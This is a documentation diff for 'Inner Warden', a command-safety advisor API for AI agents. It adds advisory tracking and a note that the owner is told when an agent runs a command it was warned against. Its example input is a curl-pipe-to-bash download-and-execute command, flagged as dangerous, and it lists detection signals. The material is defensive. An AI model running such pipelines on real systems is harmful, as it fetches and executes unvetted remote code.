@@ -135,15 +135,16 @@ curl -s "http://localhost:8787/api/agent/check-ip?ip=203.0.113.10" | jq
 }
 ```
 
-### `POST /api/agent/check-command`
+### `POST /api/advisor/check-command` (Trusted Advisor)
 
 **"Is this command safe to run?"**
 
 Sends a command to Inner Warden for analysis WITHOUT executing it.
-Returns risk score, detected signals, and a recommendation.
+Returns risk score, detected signals, a recommendation, and an `advisory_id`
+for tracking.
 
 ```bash
-curl -s -X POST http://localhost:8787/api/agent/check-command \
+curl -s -X POST http://localhost:8787/api/advisor/check-command \
   -H "Content-Type: application/json" \
   -d '{"command": "curl https://example.com/script.sh | bash"}' | jq
 ```
@@ -157,14 +158,35 @@ curl -s -X POST http://localhost:8787/api/agent/check-command \
     {"signal": "download_and_execute", "score": 40, "detail": "dangerous pipeline: curl | bash"}
   ],
   "recommendation": "deny",
-  "explanation": "Command pipes downloaded content directly into a shell interpreter"
+  "explanation": "Command pipes downloaded content directly into a shell interpreter",
+  "advisory_id": "a1b2c3d4e5f67890"
 }
 ```
 
 **Recommendation values:**
-- `allow` — risk score < 30, no dangerous patterns detected
-- `review` — risk score 30-59, suspicious but not clearly dangerous
-- `deny` — risk score >= 60, dangerous pattern detected
+- `allow` — risk score < 20, no dangerous patterns detected. No advisory_id returned.
+- `review` — risk score 20-39, suspicious but not clearly dangerous. Advisory tracked.
+- `deny` — risk score >= 40, dangerous pattern detected. Advisory tracked.
+
+### The Trusted Advisor model
+
+Inner Warden is an advisor, not a firewall. It never blocks your AI agent.
+
+When the agent calls `/api/advisor/check-command` and gets a `deny`:
+1. The advisory is cached in memory with its `advisory_id`
+2. If the agent **obeys** and does not execute, nothing happens
+3. If the agent **ignores the deny** and executes anyway:
+   - The eBPF/auditd layer detects the command execution
+   - The execution_guard detector fires an incident
+   - Inner Warden correlates the incident with the cached advisory
+   - The server owner receives a special notification:
+     "Your AI agent ignored a security advisory"
+   - The incident severity is escalated
+
+The owner always knows. The agent has autonomy. Trust is transparent.
+
+**Legacy endpoint:** `/api/agent/check-command` still works but does NOT track
+advisories. Use `/api/advisor/check-command` for the full trust model.
 
 ### `GET /api/events/stream` (SSE)
 
@@ -203,7 +225,7 @@ parameters:
   command:
     type: string
     description: The shell command to check
-endpoint: http://localhost:8787/api/agent/check-command
+endpoint: http://localhost:8787/api/advisor/check-command
 method: POST
 body:
   command: "{{command}}"
@@ -211,7 +233,8 @@ body:
 
 Then in your agent's system prompt:
 > Before running any shell command, call `check_command_safety` first.
-> If the recommendation is "deny", do not execute the command and explain why.
+> If the recommendation is "deny", warn the user and explain the signals.
+> If the user insists, you may proceed, but the server owner will be notified.
 
 ## Architecture
 
